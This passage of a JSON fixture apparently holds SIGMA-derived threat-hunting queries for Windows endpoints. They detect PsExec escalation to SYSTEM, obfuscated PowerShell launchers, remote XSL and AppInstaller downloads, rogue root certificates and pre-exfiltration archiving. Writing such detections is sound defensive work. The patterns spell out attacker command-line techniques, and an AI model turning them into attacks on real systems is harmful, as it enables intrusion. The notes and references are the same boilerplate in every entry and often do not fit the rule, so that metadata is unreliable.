            "name": "Potential Process Execution Proxy Via CL_Invocation.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"SyncInvoke \")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 984
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Suspicious Diantz Alternate Data Stream Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"diantz.exe\" and tgt.process.cmdline contains \".cab\") and tgt.process.cmdline matches \":[^\\\\\\\\]\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 985
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"ms-appinstaller\" protocol handler via command line to potentially download arbitrary files via AppInstaller.EXE\nThe downloaded files are temporarly stored in \":\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential File Download Via MS-AppInstaller Protocol Handler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*ms-appinstaller://*source=*\" and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 986
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Schtasks Creation Or Modification With SYSTEM Privileges",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /change \" or tgt.process.cmdline contains \" /create \")) and tgt.process.cmdline contains \"/ru \" and (tgt.process.cmdline contains \"NT AUT\" or tgt.process.cmdline contains \" SYSTEM \")) and (not ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/TN TVInstallRestore\" and tgt.process.cmdline contains \"\\TeamViewer_.exe\")) or (tgt.process.cmdline contains \"/Create /F /RU System /SC WEEKLY /TN AviraSystemSpeedupVerify /TR \" or tgt.process.cmdline contains \":\\Program Files (x86)\\Avira\\System Speedup\\setup\\avira_speedup_setup.exe\" or tgt.process.cmdline contains \"/VERIFY /VERYSILENT /NOSTART /NODOTNET /NORESTART\\\" /RL HIGHEST\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 987
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Suspicious GUP Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\GUP.exe\" and (not ((tgt.process.image.path contains \"\\Program Files\\Notepad++\\updater\\GUP.exe\" or tgt.process.image.path contains \"\\Program Files (x86)\\Notepad++\\updater\\GUP.exe\") or (tgt.process.image.path contains \"\\Users\\\" and (tgt.process.image.path contains \"\\AppData\\Local\\Notepad++\\updater\\GUP.exe\" or tgt.process.image.path contains \"\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 988
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of stdin to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation STDIN+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"cmd.{0,5}(?:/c|/r).+powershell.+(?:\\\\$\\\\{?input\\\\}?|noexit).+\\\\\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 989
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "PsExec/PAExec Escalation to LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -s cmd\" or tgt.process.cmdline contains \" /s cmd\" or tgt.process.cmdline contains \" \u2013s cmd\" or tgt.process.cmdline contains \" \u2014s cmd\" or tgt.process.cmdline contains \" \u2015s cmd\" or tgt.process.cmdline contains \" -s -i cmd\" or tgt.process.cmdline contains \" -s /i cmd\" or tgt.process.cmdline contains \" -s \u2013i cmd\" or tgt.process.cmdline contains \" -s \u2014i cmd\" or tgt.process.cmdline contains \" -s \u2015i cmd\" or tgt.process.cmdline contains \" /s -i cmd\" or tgt.process.cmdline contains \" /s /i cmd\" or tgt.process.cmdline contains \" /s \u2013i cmd\" or tgt.process.cmdline contains \" /s \u2014i cmd\" or tgt.process.cmdline contains \" /s \u2015i cmd\" or tgt.process.cmdline contains \" \u2013s -i cmd\" or tgt.process.cmdline contains \" \u2013s /i cmd\" or tgt.process.cmdline contains \" \u2013s \u2013i cmd\" or tgt.process.cmdline contains \" \u2013s \u2014i cmd\" or tgt.process.cmdline contains \" \u2013s \u2015i cmd\" or tgt.process.cmdline contains \" \u2014s -i cmd\" or tgt.process.cmdline contains \" \u2014s /i cmd\" or tgt.process.cmdline contains \" \u2014s \u2013i cmd\" or tgt.process.cmdline contains \" \u2014s \u2014i cmd\" or tgt.process.cmdline contains \" \u2014s \u2015i cmd\" or tgt.process.cmdline contains \" \u2015s -i cmd\" or tgt.process.cmdline contains \" \u2015s /i cmd\" or tgt.process.cmdline contains \" \u2015s \u2013i cmd\" or tgt.process.cmdline contains \" \u2015s \u2014i cmd\" or tgt.process.cmdline contains \" \u2015s \u2015i cmd\" or tgt.process.cmdline contains \" -i -s cmd\" or tgt.process.cmdline contains \" -i /s cmd\" or tgt.process.cmdline contains \" -i \u2013s cmd\" or tgt.process.cmdline contains \" -i \u2014s cmd\" or tgt.process.cmdline contains \" -i \u2015s cmd\" or tgt.process.cmdline contains \" /i -s cmd\" or tgt.process.cmdline contains \" /i /s cmd\" or tgt.process.cmdline contains \" /i \u2013s cmd\" or tgt.process.cmdline contains \" /i \u2014s cmd\" or tgt.process.cmdline contains \" /i \u2015s cmd\" or tgt.process.cmdline contains \" \u2013i -s cmd\" or tgt.process.cmdline contains \" \u2013i /s cmd\" or tgt.process.cmdline contains \" \u2013i \u2013s cmd\" or tgt.process.cmdline contains \" \u2013i \u2014s cmd\" or tgt.process.cmdline contains \" \u2013i \u2015s cmd\" or tgt.process.cmdline contains \" \u2014i -s cmd\" or tgt.process.cmdline contains \" \u2014i /s cmd\" or tgt.process.cmdline contains \" \u2014i \u2013s cmd\" or tgt.process.cmdline contains \" \u2014i \u2014s cmd\" or tgt.process.cmdline contains \" \u2014i \u2015s cmd\" or tgt.process.cmdline contains \" \u2015i -s cmd\" or tgt.process.cmdline contains \" \u2015i /s cmd\" or tgt.process.cmdline contains \" \u2015i \u2013s cmd\" or tgt.process.cmdline contains \" \u2015i \u2014s cmd\" or tgt.process.cmdline contains \" \u2015i \u2015s cmd\" or tgt.process.cmdline contains \" -s pwsh\" or tgt.process.cmdline contains \" /s pwsh\" or tgt.process.cmdline contains \" \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015s pwsh\" or tgt.process.cmdline contains \" -s -i pwsh\" or tgt.process.cmdline contains \" -s /i pwsh\" or tgt.process.cmdline contains \" -s \u2013i pwsh\" or tgt.process.cmdline contains \" -s \u2014i pwsh\" or tgt.process.cmdline contains \" -s \u2015i pwsh\" or tgt.process.cmdline contains \" /s -i pwsh\" or tgt.process.cmdline contains \" /s /i pwsh\" or tgt.process.cmdline contains \" /s \u2013i pwsh\" or tgt.process.cmdline contains \" /s \u2014i pwsh\" or tgt.process.cmdline contains \" /s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2013s -i pwsh\" or tgt.process.cmdline contains \" \u2013s /i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2014s -i pwsh\" or tgt.process.cmdline contains \" \u2014s /i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2015s -i pwsh\" or tgt.process.cmdline contains \" \u2015s /i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2015i pwsh\" or tgt.process.cmdline contains \" -i -s pwsh\" or tgt.process.cmdline contains \" -i /s pwsh\" or tgt.process.cmdline contains \" -i \u2013s pwsh\" or tgt.process.cmdline contains \" -i \u2014s pwsh\" or tgt.process.cmdline contains \" -i \u2015s pwsh\" or tgt.process.cmdline contains \" /i -s pwsh\" or tgt.process.cmdline contains \" /i /s pwsh\" or tgt.process.cmdline contains \" /i \u2013s pwsh\" or tgt.process.cmdline contains \" /i \u2014s pwsh\" or tgt.process.cmdline contains \" /i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2013i -s pwsh\" or tgt.process.cmdline contains \" \u2013i /s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2014i -s pwsh\" or tgt.process.cmdline contains \" \u2014i /s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2015i -s pwsh\" or tgt.process.cmdline contains \" \u2015i /s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2015s pwsh\" or tgt.process.cmdline contains \" -s powershell\" or tgt.process.cmdline contains \" /s powershell\" or tgt.process.cmdline contains \" \u2013s powershell\" or tgt.process.cmdline contains \" \u2014s powershell\" or tgt.process.cmdline contains \" \u2015s powershell\" or tgt.process.cmdline contains \" -s -i powershell\" or tgt.process.cmdline contains \" -s /i powershell\" or tgt.process.cmdline contains \" -s \u2013i powershell\" or tgt.process.cmdline contains \" -s \u2014i powershell\" or tgt.process.cmdline contains \" -s \u2015i powershell\" or tgt.process.cmdline contains \" /s -i powershell\" or tgt.process.cmdline contains \" /s /i powershell\" or tgt.process.cmdline contains \" /s \u2013i powershell\" or tgt.process.cmdline contains \" /s \u2014i powershell\" or tgt.process.cmdline contains \" /s \u2015i powershell\" or tgt.process.cmdline contains \" \u2013s -i powershell\" or tgt.process.cmdline contains \" \u2013s /i powershell\" or tgt.process.cmdline contains \" \u2013s \u2013i powershell\" or tgt.process.cmdline contains \" \u2013s \u2014i powershell\" or tgt.process.cmdline contains \" \u2013s \u2015i powershell\" or tgt.process.cmdline contains \" \u2014s -i powershell\" or tgt.process.cmdline contains \" \u2014s /i powershell\" or tgt.process.cmdline contains \" \u2014s \u2013i powershell\" or tgt.process.cmdline contains \" \u2014s \u2014i powershell\" or tgt.process.cmdline contains \" \u2014s \u2015i powershell\" or tgt.process.cmdline contains \" \u2015s -i powershell\" or tgt.process.cmdline contains \" \u2015s /i powershell\" or tgt.process.cmdline contains \" \u2015s \u2013i powershell\" or tgt.process.cmdline contains \" \u2015s \u2014i powershell\" or tgt.process.cmdline contains \" \u2015s \u2015i powershell\" or tgt.process.cmdline contains \" -i -s powershell\" or tgt.process.cmdline contains \" -i /s powershell\" or tgt.process.cmdline contains \" -i \u2013s powershell\" or tgt.process.cmdline contains \" -i \u2014s powershell\" or tgt.process.cmdline contains \" -i \u2015s powershell\" or tgt.process.cmdline contains \" /i -s powershell\" or tgt.process.cmdline contains \" /i /s powershell\" or tgt.process.cmdline contains \" /i \u2013s powershell\" or tgt.process.cmdline contains \" /i \u2014s powershell\" or tgt.process.cmdline contains \" /i \u2015s powershell\" or tgt.process.cmdline contains \" \u2013i -s powershell\" or tgt.process.cmdline contains \" \u2013i /s powershell\" or tgt.process.cmdline contains \" \u2013i \u2013s powershell\" or tgt.process.cmdline contains \" \u2013i \u2014s powershell\" or tgt.process.cmdline contains \" \u2013i \u2015s powershell\" or tgt.process.cmdline contains \" \u2014i -s powershell\" or tgt.process.cmdline contains \" \u2014i /s powershell\" or tgt.process.cmdline contains \" \u2014i \u2013s powershell\" or tgt.process.cmdline contains \" \u2014i \u2014s powershell\" or tgt.process.cmdline contains \" \u2014i \u2015s powershell\" or tgt.process.cmdline contains \" \u2015i -s powershell\" or tgt.process.cmdline contains \" \u2015i /s powershell\" or tgt.process.cmdline contains \" \u2015i \u2013s powershell\" or tgt.process.cmdline contains \" \u2015i \u2014s powershell\" or tgt.process.cmdline contains \" \u2015i \u2015s powershell\") and (tgt.process.cmdline contains \"psexec\" or tgt.process.cmdline contains \"paexec\" or tgt.process.cmdline contains \"accepteula\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 990
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Use Clip",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"(?i)echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?)\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 991
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Root Certificate Installed From Susp Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Import-Certificate\" and tgt.process.cmdline contains \" -FilePath \" and tgt.process.cmdline contains \"Cert:\\LocalMachine\\Root\") and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Perflogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 992
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1074"
            ],
            "name": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath $env:TEMP*\" or tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\*\" or tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 993
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "Remote XSL Execution Via Msxsl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\msxsl.exe\" and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 994
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects ScreenConnect program starts that establish a remote access to a system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Remote Access Tool - ScreenConnect Installation Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"e=Access&\" and tgt.process.cmdline contains \"y=Guest&\" and tgt.process.cmdline contains \"&p=\" and tgt.process.cmdline contains \"&c=\" and tgt.process.cmdline contains \"&k=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 995
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Suspect Svchost Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
